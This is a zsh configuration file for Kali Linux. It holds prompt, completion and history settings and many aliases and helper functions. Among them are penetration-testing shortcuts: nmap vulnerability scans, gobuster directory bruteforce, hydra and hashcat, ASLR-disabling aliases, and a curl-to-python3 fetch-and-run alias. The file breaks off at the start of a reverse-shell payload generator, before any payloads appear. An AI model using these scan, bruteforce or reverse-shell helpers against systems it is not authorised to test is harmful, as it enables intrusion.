#!/usr/bin/env zsh
# ═══════════════════════════════════════════════════════════════════════════
#  ██╗  ██╗ █████╗ ██╗     ██╗    ██╗   ██╗██╗  ██╗████████╗██████╗  █████╗ 
#  ██║ ██╔╝██╔══██╗██║     ██║    ██║   ██║██║  ██║╚══██╔══╝██╔══██╗██╔══██╗
#  █████╔╝ ███████║██║     ██║    ██║   ██║██║  ██║   ██║   ██████╔╝███████║
#  ██╔═██╗ ██╔══██║██║     ██║    ██║   ██║██║  ██║   ██║   ██╔══██╗██╔══██║
#  ██║  ██╗██║  ██║███████╗██║    ╚██████╔╝███████╔╝   ██║   ██║  ██║██║  ██║
#  ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝     ╚═════╝ ╚══════╝    ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝
# ═══════════════════════════════════════════════════════════════════════════
#  CYBER TERMINAL CONFIGURATION - ULTRA MODERN KALI LINUX EDITION
# ═══════════════════════════════════════════════════════════════════════════

# ┌─────────────────────────────────────────────────────────────────────────┐
# │ CORE OPTIONS - Advanced Shell Behavior                                 │
# └─────────────────────────────────────────────────────────────────────────┘
setopt autocd                    # Auto cd by typing directory name
setopt autopushd                 # Auto push to directory stack
setopt pushdsilent               # Don't print stack after pushd/popd
setopt pushdtohome               # pushd without args = pushd $HOME
setopt pushdignoredups           # Ignore duplicates in stack
setopt interactivecomments       # Allow comments in interactive mode
setopt ksharrays                 # Arrays start at 0
setopt magicequalsubst           # Filename expansion for 'x=expr' args
setopt nonomatch                 # Hide errors when pattern doesn't match
setopt notify                    # Immediate background job notification
setopt numericglobsort           # Sort filenames numerically
setopt promptsubst               # Command substitution in prompt
setopt extendedglob              # Advanced globbing
setopt nocaseglob                # Case-insensitive globbing
setopt rcexpandparam             # Enhanced array expansion
setopt correct                   # Auto command correction
setopt cdablevars                # cd into variables

WORDCHARS=${WORDCHARS//\/}       # Don't consider / as part of word
export PROMPT_EOL_MARK=""        # Hide EOL mark '%'

# ┌─────────────────────────────────────────────────────────────────────────┐
# │ KEYBINDINGS - Enhanced Keyboard Controls                               │
# └─────────────────────────────────────────────────────────────────────────┘
bindkey -e                                        # emacs key bindings

# Basic navigation
bindkey '^[[H' beginning-of-line                  # home
bindkey '^[[F' end-of-line                        # end
bindkey '^[[1;5H' beginning-of-line               # ctrl + home
bindkey '^[[1;5F' end-of-line                     # ctrl + end

# Word navigation
bindkey '^[[1;5C' forward-word                    # ctrl + →
bindkey '^[[1;5D' backward-word                   # ctrl + ←
bindkey '^[[C' forward-word                       # →
bindkey '^[[D' backward-word                      # ←

# Delete keys - FIXED: elimina carattere per carattere
bindkey '^[[3~' delete-char                       # del - delete character
bindkey '^[3;5~' delete-char                      # ctrl + del
bindkey '^H' backward-delete-char                 # ctrl + backspace - delete backward
bindkey '^?' backward-delete-char                 # backspace - delete backward

# Kill operations
bindkey '^[[3;5~' kill-word                       # ctrl + del - kill word forward
bindkey '^W' kill-region                          # ctrl + w - kill region

# History and completion
bindkey '^[[5~' beginning-of-buffer-or-history    # page up
bindkey '^[[6~' end-of-buffer-or-history          # page down
bindkey '^[[Z' undo                               # shift + tab
bindkey ' ' magic-space                           # history expansion on space

# Additional fixes for delete behavior
bindkey "\e[3~" delete-char
bindkey "\e[1;3D" backward-word
bindkey "\e[1;3C" forward-word

# Fix per problemi di cancellazione su alcuni terminali
bindkey '^U' backward-kill-line

# ┌─────────────────────────────────────────────────────────────────────────┐
# │ COMPLETION SYSTEM - Ultra Advanced Autocompletion                      │
# └─────────────────────────────────────────────────────────────────────────┘
autoload -Uz compinit
compinit -d ~/.cache/zcompdump

# Advanced completion styles
zstyle ':completion:*' menu select                                    # Interactive menu
zstyle ':completion:*' matcher-list 'm:{a-zA-Z}={A-Za-z}'            # Case insensitive
zstyle ':completion:*' list-colors "${(s.:.)LS_COLORS}"              # LS colors
zstyle ':completion:*' group-name ''                                  # Group by type
zstyle ':completion:*:descriptions' format '%F{green}━━ %d ━━%f'     # Headers
zstyle ':completion:*:warnings' format '%F{red}✘ No matches: %d%f'
zstyle ':completion:*:corrections' format '%F{yellow}⚠ %d (errors: %e)%f'
zstyle ':completion:*:messages' format '%F{cyan}── %d ──%f'
zstyle ':completion:*' verbose yes
zstyle ':completion:*' use-cache on
zstyle ':completion:*' cache-path ~/.cache/zsh
zstyle ':completion:*:*:kill:*' menu yes select
zstyle ':completion:*:kill:*' force-list always
zstyle ':completion:*:*:killall:*' menu yes select
zstyle ':completion:*:killall:*' force-list always
zstyle ':completion:*:cd:*' ignore-parents parent pwd

# ┌─────────────────────────────────────────────────────────────────────────┐
# │ HISTORY - Enhanced History Configuration                               │
# └─────────────────────────────────────────────────────────────────────────┘
HISTFILE=~/.zsh_history
HISTSIZE=50000
SAVEHIST=50000
setopt hist_expire_dups_first    # Delete duplicates first if HISTFILE full
setopt hist_ignore_dups          # Ignore duplicate commands
setopt hist_ignore_space         # Ignore commands starting with space
setopt hist_verify               # Show command with expansion before executing
setopt hist_ignore_all_dups      # Remove all duplicates from history
setopt hist_save_no_dups         # Don't save duplicates
setopt hist_reduce_blanks        # Remove extra spaces
setopt share_history             # Share history between sessions
setopt inc_append_history        # Add commands immediately

alias history="history 0"        # Force zsh to show all history

# ┌─────────────────────────────────────────────────────────────────────────┐
# │ CHROOT DETECTION                                                        │
# └─────────────────────────────────────────────────────────────────────────┘
if [ -z "${debian_chroot:-}" ] && [ -r /etc/debian_chroot ]; then
    debian_chroot=$(cat /etc/debian_chroot)
fi

# ┌─────────────────────────────────────────────────────────────────────────┐
# │ CYBER PROMPT - Ultra Modern Futuristic Design                          │
# └─────────────────────────────────────────────────────────────────────────┘

# Force colored prompt
color_prompt=yes
force_color_prompt=yes

# Git branch function
parse_git_branch() {
    git branch 2>/dev/null | sed -e '/^[^*]/d' -e 's/* \(.*\)/ \1/'
}

# Git status function (with symbols)
parse_git_status() {
    local git_status="$(git status 2>/dev/null)"
    local git_dirty=""
    
    if [[ $git_status =~ "Changes not staged" ]]; then
        git_dirty="%F{yellow}⚡%f"
    fi
    if [[ $git_status =~ "Changes to be committed" ]]; then
        git_dirty="${git_dirty}%F{green}✓%f"
    fi
    if [[ $git_status =~ "Untracked files" ]]; then
        git_dirty="${git_dirty}%F{red}●%f"
    fi
    
    echo $git_dirty
}

# Complete git info function
git_prompt_info() {
    local branch=$(parse_git_branch)
    if [ -n "$branch" ]; then
        local status=$(parse_git_status)
        echo "%F{magenta}[%F{cyan}${branch}%f${status}%F{magenta}]%f"
    fi
}

# Background job count function
job_count() {
    local job_n=$(jobs | wc -l)
    if [ $job_n -gt 0 ]; then
        echo "%F{yellow}⚙ $job_n%f "
    fi
}

# Show last exit code if error
exit_code() {
    echo "%(?.%F{green}●.%F{red}✘ %?)%f"
}

# Abbreviated path with colors
colored_path() {
    echo "%F{cyan}%(5~|%-1~/…/%3~|%~)%f"
}

# Current time function
current_time() {
    echo "%F{blue}[%*]%f"
}

# Colored username function
colored_user() {
    if [[ $EUID -eq 0 ]]; then
        echo "%F{red}%B%n%b%f"
    else
        echo "%F{green}%B%n%b%f"
    fi
}

# Hostname function
colored_host() {
    echo "%F{magenta}%B%m%b%f"
}

# Root/user symbol function
prompt_symbol() {
    if [[ $EUID -eq 0 ]]; then
        echo "%F{red}%B#%b%f"
    else
        echo "%F{green}%B$%b%f"
    fi
}

if [ "$color_prompt" = yes ]; then
    # ╔══════════════════════════════════════════════════════════════════════╗
    # ║  MAIN PROMPT - Cyber Futuristic Multi-Line Design                   ║
    # ╚══════════════════════════════════════════════════════════════════════╝
    
    # Top line with graphic box
    PROMPT=$'%F{green}╭─${debian_chroot:+%F{yellow}[%F{red}$debian_chroot%F{yellow}]%F{green}─}[$(colored_user)%F{blue}@%f$(colored_host)%F{green}]─[$(colored_path)%F{green}]$(git_prompt_info)\n╰─$(exit_code) $(prompt_symbol) %f'
    
    # Right prompt with system info
    RPROMPT=$'$(job_count)$(current_time)'
    
    # Continuation prompt (for multi-line commands)
    PROMPT2="%F{green}│%f "
    
    # ╔══════════════════════════════════════════════════════════════════════╗
    # ║  SYNTAX HIGHLIGHTING - Real-Time Code Highlighting                  ║
    # ╚══════════════════════════════════════════════════════════════════════╝
    
    # Syntax highlighting plugin (replace USERNAME with your username)
    if [ -f ~/.oh-my-zsh/custom/plugins/zsh-syntax-highlighting/zsh-syntax-highlighting.zsh ]; then
        unsetopt ksharrays  # fix for plugin
        source ~/.oh-my-zsh/custom/plugins/zsh-syntax-highlighting/zsh-syntax-highlighting.zsh
        
        # Cyber theme styles
        ZSH_HIGHLIGHT_HIGHLIGHTERS=(main brackets pattern cursor)
        
        # Commands and basic syntax
        ZSH_HIGHLIGHT_STYLES[unknown-token]='fg=red,bold'
        ZSH_HIGHLIGHT_STYLES[reserved-word]='fg=magenta,bold'
        ZSH_HIGHLIGHT_STYLES[alias]='fg=cyan,bold'
        ZSH_HIGHLIGHT_STYLES[suffix-alias]='fg=cyan,bold,underline'
        ZSH_HIGHLIGHT_STYLES[global-alias]='fg=cyan,bold'
        ZSH_HIGHLIGHT_STYLES[builtin]='fg=green,bold'
        ZSH_HIGHLIGHT_STYLES[function]='fg=green,bold'
        ZSH_HIGHLIGHT_STYLES[command]='fg=green,bold'
        ZSH_HIGHLIGHT_STYLES[precommand]='fg=green,bold,underline'
        ZSH_HIGHLIGHT_STYLES[commandseparator]='fg=yellow,bold'
        ZSH_HIGHLIGHT_STYLES[hashed-command]='fg=green'
        
        # Path and directory
        ZSH_HIGHLIGHT_STYLES[autodirectory]='fg=cyan,underline'
        ZSH_HIGHLIGHT_STYLES[path]='fg=cyan,underline'
        ZSH_HIGHLIGHT_STYLES[path_pathseparator]='fg=blue'
        ZSH_HIGHLIGHT_STYLES[path_prefix_pathseparator]='fg=blue'
        
        # Globbing and expansions
        ZSH_HIGHLIGHT_STYLES[globbing]='fg=blue,bold'
        ZSH_HIGHLIGHT_STYLES[history-expansion]='fg=magenta,bold'
        ZSH_HIGHLIGHT_STYLES[command-substitution]='fg=yellow'
        ZSH_HIGHLIGHT_STYLES[command-substitution-delimiter]='fg=magenta,bold'
        ZSH_HIGHLIGHT_STYLES[process-substitution]='fg=yellow'
        ZSH_HIGHLIGHT_STYLES[process-substitution-delimiter]='fg=magenta,bold'
        
        # Arguments and options
        ZSH_HIGHLIGHT_STYLES[single-hyphen-option]='fg=yellow'
        ZSH_HIGHLIGHT_STYLES[double-hyphen-option]='fg=yellow'
        ZSH_HIGHLIGHT_STYLES[back-quoted-argument]='fg=yellow'
        ZSH_HIGHLIGHT_STYLES[back-quoted-argument-delimiter]='fg=magenta'
        
        # Strings
        ZSH_HIGHLIGHT_STYLES[single-quoted-argument]='fg=yellow'
        ZSH_HIGHLIGHT_STYLES[double-quoted-argument]='fg=yellow'
        ZSH_HIGHLIGHT_STYLES[dollar-quoted-argument]='fg=yellow'
        ZSH_HIGHLIGHT_STYLES[rc-quote]='fg=cyan'
        ZSH_HIGHLIGHT_STYLES[dollar-double-quoted-argument]='fg=cyan'
        ZSH_HIGHLIGHT_STYLES[back-double-quoted-argument]='fg=cyan'
        ZSH_HIGHLIGHT_STYLES[back-dollar-quoted-argument]='fg=cyan'
        
        # Redirection and assignment
        ZSH_HIGHLIGHT_STYLES[redirection]='fg=magenta,bold'
        ZSH_HIGHLIGHT_STYLES[assign]='fg=blue'
        ZSH_HIGHLIGHT_STYLES[named-fd]='fg=blue'
        ZSH_HIGHLIGHT_STYLES[numeric-fd]='fg=blue'
        
        # Comments
        ZSH_HIGHLIGHT_STYLES[comment]='fg=242,bold'
        
        # Brackets
        ZSH_HIGHLIGHT_STYLES[bracket-error]='fg=red,bold'
        ZSH_HIGHLIGHT_STYLES[bracket-level-1]='fg=cyan,bold'
        ZSH_HIGHLIGHT_STYLES[bracket-level-2]='fg=green,bold'
        ZSH_HIGHLIGHT_STYLES[bracket-level-3]='fg=magenta,bold'
        ZSH_HIGHLIGHT_STYLES[bracket-level-4]='fg=yellow,bold'
        ZSH_HIGHLIGHT_STYLES[bracket-level-5]='fg=blue,bold'
        ZSH_HIGHLIGHT_STYLES[cursor-matchingbracket]='bg=blue,fg=white,bold'
        
        # Cursor
        ZSH_HIGHLIGHT_STYLES[cursor]='bg=white'
    fi
else
    PROMPT='${debian_chroot:+($debian_chroot)}%n@%m:%~%# '
fi

unset color_prompt force_color_prompt

# ┌─────────────────────────────────────────────────────────────────────────┐
# │ TERMINAL TITLE - Dynamic Window Title                                   │
# └─────────────────────────────────────────────────────────────────────────┘
case "$TERM" in
xterm*|rxvt*|alacritty*|kitty*)
    TERM_TITLE=$'\e]0;${debian_chroot:+($debian_chroot)}%n@%m: %~\a'
    ;;
*)
    ;;
esac

# ┌─────────────────────────────────────────────────────────────────────────┐
# │ PRECMD - Pre-Prompt Functions                                           │
# └─────────────────────────────────────────────────────────────────────────┘
new_line_before_prompt=yes
precmd() {
    print -Pn "$TERM_TITLE"
    
    # Print empty line before prompt (except first time)
    if [ "$new_line_before_prompt" = yes ]; then
        if [ -z "$_NEW_LINE_BEFORE_PROMPT" ]; then
            _NEW_LINE_BEFORE_PROMPT=1
        else
            print ""
        fi
    fi
}

# ┌─────────────────────────────────────────────────────────────────────────┐
# │ COLOR SUPPORT - Color Support for System Commands                      │
# └─────────────────────────────────────────────────────────────────────────┘
if [ -x /usr/bin/dircolors ]; then
    test -r ~/.dircolors && eval "$(dircolors -b ~/.dircolors)" || eval "$(dircolors -b)"
    
    # Enable colors for common commands
    alias ls='ls --color=auto'
    alias grep='grep --color=auto'
    alias fgrep='fgrep --color=auto'
    alias egrep='egrep --color=auto'
    alias diff='diff --color=auto'
    alias ip='ip --color=auto'
    
    # Colors for man pages and less
    export LESS_TERMCAP_mb=$'\E[1;31m'     # Start blink
    export LESS_TERMCAP_md=$'\E[1;36m'     # Start bold
    export LESS_TERMCAP_me=$'\E[0m'        # End bold/blink
    export LESS_TERMCAP_so=$'\E[01;44;33m' # Start standout
    export LESS_TERMCAP_se=$'\E[0m'        # End standout
    export LESS_TERMCAP_us=$'\E[1;32m'     # Start underline
    export LESS_TERMCAP_ue=$'\E[0m'        # End underline
    
    # Use LS_COLORS for completion too
    zstyle ':completion:*' list-colors "${(s.:.)LS_COLORS}"
fi

# ┌─────────────────────────────────────────────────────────────────────────┐
# │ AUTO-SUGGESTIONS - Intelligent History Suggestions                     │
# └─────────────────────────────────────────────────────────────────────────┘
if [ -f /usr/share/zsh-autosuggestions/zsh-autosuggestions.zsh ]; then
    source /usr/share/zsh-autosuggestions/zsh-autosuggestions.zsh
    ZSH_AUTOSUGGEST_HIGHLIGHT_STYLE='fg=240'
    ZSH_AUTOSUGGEST_STRATEGY=(history completion)
    ZSH_AUTOSUGGEST_BUFFER_MAX_SIZE=20
fi

# ┌─────────────────────────────────────────────────────────────────────────┐
# │ ALIASES - Ultra Enhanced Command Shortcuts                             │
# └─────────────────────────────────────────────────────────────────────────┘

# ═══ FAST NAVIGATION ═══
alias ..='cd ..'
alias ...='cd ../..'
alias ....='cd ../../..'
alias .....='cd ../../../..'
alias -- -='cd -'                    # Go to previous directory

# ═══ LS VARIANTS ═══
alias l='ls -lFh --color=auto'       # Long list
alias la='ls -lAFh --color=auto'     # All files
alias ll='ls -lh --color=auto'       # Long list
alias ls='ls --color=auto'           # Colors
alias lsa='ls -lah --color=auto'     # All with details
alias lt='ls -ltFh --color=auto'     # Sort by date
alias lS='ls -lSFh --color=auto'     # Sort by size
alias lr='ls -tRFh --color=auto'     # Recursive sorted
alias ldot='ls -ld .* --color=auto'  # Only dotfiles
alias tree='tree -C'                  # Tree with colors

# ═══ ENHANCED GREP ═══
alias grep='grep --color=auto'
alias fgrep='fgrep --color=auto'
alias egrep='egrep --color=auto'
alias rgrep='grep -r --color=auto'
alias sgrep='grep -r -n -H -C 5 --exclude-dir={.git,.svn,CVS} --color=auto'

# ═══ SYSTEM & PACKAGE MANAGEMENT ═══
alias update='sudo apt update && sudo apt upgrade -y'
alias install='sudo apt install -y'
alias remove='sudo apt remove'
alias autoremove='sudo apt autoremove -y'
alias search='apt search'
alias show='apt show'
alias clean='sudo apt autoremove -y && sudo apt autoclean'
alias upgrade='sudo apt update && sudo apt full-upgrade -y'

# ═══ DIRECTORY OPERATIONS ═══
alias md='mkdir -pv'
alias rd='rmdir'
alias mkdir='mkdir -pv'

# ═══ FILE OPERATIONS ═══
alias cp='cp -iv'                    # Interactive copy
alias mv='mv -iv'                    # Interactive move
alias rm='rm -Iv --preserve-root'    # Safe removal
alias ln='ln -i'
alias chown='chown --preserve-root'
alias chmod='chmod --preserve-root'
alias chgrp='chgrp --preserve-root'

# ═══ DISK USAGE ═══
alias df='df -h'
alias du='du -ch'
alias du1='du -d 1 -h'
alias dus='du -sh'
alias free='free -h'

# ═══ PROCESS & SYSTEM ═══
alias ps='ps auxf'
alias psg='ps aux | grep -v grep | grep -i -e VSZ -e'
alias top='htop'
alias topc='htop -s PERCENT_CPU'
alias topm='htop -s PERCENT_MEM'

# ═══ NETWORK TOOLS ═══
alias ports='netstat -tulanp'
alias listening='lsof -i -P | grep LISTEN'
alias myip='curl -s ifconfig.me'
alias localip='ip addr show | grep inet'
alias ips='ip -c addr'
alias ping='ping -c 5'
alias fastping='ping -c 100 -i.2'
alias wget='wget -c'
alias speedtest='curl -s https://raw.githubusercontent.com/sivel/speedtest-cli/master/speedtest.py | python3 -'

# ═══ COLORED IFCONFIG ═══
ifconfig() {
    if command -v ip >/dev/null 2>&1; then
        echo -e "\e[36m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\e[0m"
        echo -e "\e[32m🖧 NETWORK INTERFACES\e[0m"
        echo -e "\e[36m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\e[0m"
        
        # Get interface info with colors
        /sbin/ip -c addr show | while read line; do
            if [[ $line =~ ^[0-9]+: ]]; then
                # Interface name
                echo -e "\e[33m${line}\e[0m"
            elif [[ $line =~ inet ]]; then
                # IP addresses
                echo -e "  \e[32m${line}\e[0m"
            elif [[ $line =~ link/ether ]]; then
                # MAC addresses
                echo -e "  \e[35m${line}\e[0m"
            else
                echo "  $line"
            fi
        done
        
        echo -e "\e[36m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\e[0m"
        echo -e "\e[32m🌐 ROUTING TABLE\e[0m"
        echo -e "\e[36m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\e[0m"
        /sbin/ip -c route show
    else
        command ifconfig "$@"
    fi
}

# ═══ KALI SECURITY TOOLS ═══
alias nmap='sudo nmap'
alias nmapquick='sudo nmap -sV -T4'
alias nmapfull='sudo nmap -sS -sV -O -A -p-'
alias nmapvuln='sudo nmap --script vuln'
alias metasploit='msfconsole -q'
alias msf='msfconsole -q'
alias msfupdate='sudo msfupdate'
alias wireshark='sudo wireshark'
alias airmon='sudo airmon-ng'
alias airodump='sudo airodump-ng'
alias burp='java -jar /usr/bin/burpsuite &'
alias sqlmap='sqlmap --batch --random-agent'
alias hydra='hydra -V'
alias john='john --format=raw-md5'
alias hashcat='hashcat -m 0'
alias gobuster='gobuster -k'
alias nikto='nikto -h'

# ═══ GIT ENHANCED ═══
alias g='git'
alias gs='git status'
alias ga='git add'
alias gaa='git add --all'
alias gc='git commit -m'
alias gca='git commit -am'
alias gp='git push'
alias gpl='git pull'
alias gd='git diff'
alias gdc='git diff --cached'
alias gl='git log --oneline --graph --decorate --all'
alias gll='git log --graph --pretty=format:"%C(yellow)%h%Creset %C(cyan)%an%Creset %s %C(green)(%cr)%Creset" --abbrev-commit'
alias gb='git branch'
alias gco='git checkout'
alias gcb='git checkout -b'
alias gm='git merge'
alias gr='git remote -v'
alias gclone='git clone'

# ═══ DOCKER ═══
alias d='docker'
alias dps='docker ps'
alias dpsa='docker ps -a'
alias dimg='docker images'
alias drm='docker rm'
alias drmi='docker rmi'
alias dstop='docker stop'
alias dstart='docker start'
alias dex='docker exec -it'
alias dlogs='docker logs -f'
alias dprune='docker system prune -af'

# ═══ PYTHON ═══
alias py='python3'
alias python='python3'
alias pip='pip3'
alias venv='python3 -m venv'
alias activate='source venv/bin/activate'

# ═══ TEXT EDITORS ═══
alias v='vim'
alias vi='vim'
alias nano='nano -c'
alias svi='sudo vim'

# ═══ HISTORY ═══
alias h='history'
alias hg='history | grep'
alias histg='history | grep'

# ═══ SERVICES ═══
alias sstart='sudo systemctl start'
alias sstop='sudo systemctl stop'
alias srestart='sudo systemctl restart'
alias sstatus='sudo systemctl status'
alias senable='sudo systemctl enable'
alias sdisable='sudo systemctl disable'

# ═══ SAFETY ═══
alias please='sudo'
alias fuck='sudo $(fc -ln -1)'       # Repeat last command with sudo
alias pls='sudo'

# ═══ MISC UTILS ═══
alias c='clear'
alias cls='clear'
alias e='exit'
alias path='echo -e ${PATH//:/\\n}'
alias now='date +"%d-%m-%Y %T"'
alias nowdate='date +"%d-%m-%Y"'
alias week='date +%V'
alias timer='echo "Timer started. Stop with Ctrl-D." && date && time cat && date'
alias reload='source ~/.zshrc'
alias zshrc='${EDITOR:-vim} ~/.zshrc'
alias aslr_off='echo 0 | sudo tee /proc/sys/kernel/randomize_va_space'
alias aslr_on='echo 2 | sudo tee /proc/sys/kernel/randomize_va_space'

# ┌─────────────────────────────────────────────────────────────────────────┐
# │ CUSTOM FUNCTIONS - Advanced Functions for Hacking & Productivity       │
# └─────────────────────────────────────────────────────────────────────────┘

# ═══ FAST NETWORK SCAN ═══
quickscan() {
    if [ -z "$1" ]; then
        echo "Usage: quickscan <target>"
        echo "Fast nmap scan with versioning"
        return 1
    fi
    echo "[*] Scanning $1..."
    sudo nmap -sV -sC -T4 -oN "scan_$1_$(date +%Y%m%d_%H%M%S).txt" "$1"
}

# ═══ FULL NETWORK SCAN ═══
fullscan() {
    if [ -z "$1" ]; then
        echo "Usage: fullscan <target>"
        echo "Complete nmap scan (may take time)"
        return 1
    fi
    echo "[*] Full scan of $1..."
    sudo nmap -sS -sV -O -A -p- -T4 -oN "fullscan_$1_$(date +%Y%m%d_%H%M%S).txt" "$1"
}

# ═══ VULNERABILITY SCAN ═══
vulnscan() {
    if [ -z "$1" ]; then
        echo "Usage: vulnscan <target>"
        echo "Vulnerability scan with nmap"
        return 1
    fi
    echo "[*] Vulnerability scan of $1..."
    sudo nmap --script vuln -oN "vulnscan_$1_$(date +%Y%m%d_%H%M%S).txt" "$1"
}

# ═══ WEB DIRECTORY BRUTEFORCE ═══
dirscan() {
    if [ -z "$1" ]; then
        echo "Usage: dirscan <url>"
        echo "Directory bruteforce with gobuster"
        return 1
    fi
    echo "[*] Directory scan of $1..."
    gobuster dir -u "$1" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o "dirscan_$(echo $1 | sed 's/[^a-zA-Z0-9]/_/g')_$(date +%Y%m%d_%H%M%S).txt"
}

# ═══ UNIVERSAL EXTRACTION ═══
extract() {
    if [ -z "$1" ]; then
        echo "Usage: extract <file>"
        echo "Extract any archive type"
        return 1
    fi
    
    if [ -f "$1" ]; then
        case "$1" in
            *.tar.bz2)   tar xjf "$1"     ;;
            *.tar.gz)    tar xzf "$1"     ;;
            *.bz2)       bunzip2 "$1"     ;;
            *.rar)       unrar x "$1"     ;;
            *.gz)        gunzip "$1"      ;;
            *.tar)       tar xf "$1"      ;;
            *.tbz2)      tar xjf "$1"     ;;
            *.tgz)       tar xzf "$1"     ;;
            *.zip)       unzip "$1"       ;;
            *.Z)         uncompress "$1"  ;;
            *.7z)        7z x "$1"        ;;
            *.deb)       ar x "$1"        ;;
            *.tar.xz)    tar xf "$1"      ;;
            *.tar.zst)   tar xf "$1"      ;;
            *)           echo "'$1' cannot be extracted with extract()" ;;
        esac
    else
        echo "'$1' is not a valid file"
    fi
}

# ═══ UNIVERSAL COMPRESSION ═══
compress() {
    if [ -z "$1" ] || [ -z "$2" ]; then
        echo "Usage: compress <archive.ext> <file/directory>"
        echo "Supported formats: .tar.gz .tar.bz2 .zip .7z"
        return 1
    fi
    
    case "$1" in
        *.tar.gz)  tar czf "$1" "$2" ;;
        *.tar.bz2) tar cjf "$1" "$2" ;;
        *.zip)     zip -r "$1" "$2"  ;;
        *.7z)      7z a "$1" "$2"    ;;
        *)         echo "Unsupported format. Use: .tar.gz .tar.bz2 .zip .7z" ;;
    esac
}

# ═══ FAST FILE FIND ═══
ff() {
    if [ -z "$1" ]; then
        echo "Usage: ff <pattern>"
        echo "Find files by name (case-insensitive)"
        return 1
    fi
    find . -type f -iname "*$1*" 2>/dev/null
}

# ═══ FIND DIRECTORY ═══
fd() {
    if [ -z "$1" ]; then
        echo "Usage: fd <pattern>"
        echo "Find directory by name"
        return 1
    fi
    find . -type d -iname "*$1*" 2>/dev/null
}

# ═══ MKDIR + CD ═══
mkcd() {
    if [ -z "$1" ]; then
        echo "Usage: mkcd <directory>"
        return 1
    fi
    mkdir -p "$1" && cd "$1"
}

# ═══ FILE BACKUP ═══
backup() {
    if [ -z "$1" ]; then
        echo "Usage: backup <file>"
        echo "Create backup with timestamp"
        return 1
    fi
    cp "$1" "$1.backup_$(date +%Y%m%d_%H%M%S)"
    echo "Backup created: $1.backup_$(date +%Y%m%d_%H%M%S)"
}

# ═══ FILE HASH CALCULATION ═══
hashfile() {
    if [ -z "$1" ]; then
        echo "Usage: hashfile <file>"
        echo "Calculate MD5, SHA1, SHA256 of file"
        return 1
    fi
    echo "MD5:    $(md5sum "$1" | awk '{print $1}')"
    echo "SHA1:   $(sha1sum "$1" | awk '{print $1}')"
    echo "SHA256: $(sha256sum "$1" | awk '{print $1}')"
}

# ═══ FAST PORT SCAN ═══
portscan() {
    if [ -z "$1" ]; then
        echo "Usage: portscan <host>"
        echo "Fast common ports scan"
        return 1
    fi
    echo "[*] Scanning common ports on $1..."
    sudo nmap -F -T4 "$1"
}

# ═══ FAST HTTP SERVER ═══
serve() {
    local port="${1:-8000}"
    echo "[*] Starting HTTP server on port $port..."
    echo "[*] Access: http://localhost:$port"
    python3 -m http.server "$port"
}

# ═══ RANDOM PASSWORD GENERATOR ═══
genpass() {
    local length="${1:-20}"
    echo "Generated password:"
    openssl rand -base64 48 | cut -c1-"$length"
}

# ═══ NETWORK TRAFFIC MONITOR ═══
netmon() {
    echo "[*] Monitoring network traffic (Ctrl+C to stop)..."
    sudo tcpdump -i any -nn -v
}

# ═══ PORT CHECK ═══
checkport() {
    if [ -z "$1" ] || [ -z "$2" ]; then
        echo "Usage: checkport <host> <port>"
        return 1
    fi
    nc -zv "$1" "$2" 2>&1
}

# ═══ SYSTEM INFORMATION ═══
sysinfo() {
    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    echo " SYSTEM INFORMATION"
    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    echo "Hostname:    $(hostname)"
    echo "OS:          $(lsb_release -ds 2>/dev/null || cat /etc/*release | grep PRETTY_NAME | cut -d'"' -f2)"
    echo "Kernel:      $(uname -r)"
    echo "Uptime:      $(uptime -p)"
    echo "Shell:       $SHELL"
    echo "CPU:         $(lscpu | grep 'Model name' | cut -d':' -f2 | xargs)"
    echo "Memory:      $(free -h | awk '/^Mem:/ {print $3 "/" $2}')"
    echo "Disk:        $(df -h / | awk 'NR==2 {print $3 "/" $2 " (" $5 ")"}')"
    echo "Local IP:    $(hostname -I | awk '{print $1}')"
    echo "Public IP:   $(curl -s ifconfig.me)"
    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
}

# ═══ FIND LARGE FILES ═══
bigfiles() {
    local num="${1:-10}"
    echo "[*] Top $num largest files:"
    find . -type f -exec du -h {} + 2>/dev/null | sort -rh | head -n "$num"
}

# ═══ DIRECTORY CHANGE MONITOR ═══
watchdir() {
    if [ -z "$1" ]; then
        echo "Usage: watchdir <directory>"
        echo "Monitor directory changes"
        return 1
    fi
    echo "[*] Monitoring $1 for changes..."
    inotifywait -m -r -e modify,create,delete "$1"
}

# ═══ KILL PROCESS BY NAME ═══
killps() {
    if [ -z "$1" ]; then
        echo "Usage: killps <process_name>"
        return 1
    fi
    ps aux | grep -i "$1" | grep -v grep | awk '{print $2}' | xargs -r sudo kill -9
    echo "[*] Killed all processes matching: $1"
}

# ═══ BASE64 ENCODE/DECODE ═══
b64encode() {
    if [ -z "$1" ]; then
        echo "Usage: b64encode <string>"
        return 1
    fi
    echo -n "$1" | base64
}

b64decode() {
    if [ -z "$1" ]; then
        echo "Usage: b64decode <base64_string>"
        return 1
    fi
    echo -n "$1" | base64 -d
}

# ═══ URL ENCODE/DECODE ═══
urlencode() {
    if [ -z "$1" ]; then
        echo "Usage: urlencode <string>"
        return 1
    fi
    python3 -c "import urllib.parse; print(urllib.parse.quote('$1'))"
}

urldecode() {
    if [ -z "$1" ]; then
        echo "Usage: urldecode <encoded_string>"
        return 1
    fi
    python3 -c "import urllib.parse; print(urllib.parse.unquote('$1'))"
}

# ═══ REVERSE SHELL GENERATOR ═══
revshell() {
    if [ -z "$1" ] || [ -z "$2" ]; then
        echo "Usage: revshell <LHOST> <LPORT>"
        echo "Generate reverse shell payloads"
        return 1
    fi
    
    local lhost="$1"
    local lport="$2"
    
    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    echo " REVERSE SHELL PAYLOADS"
    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
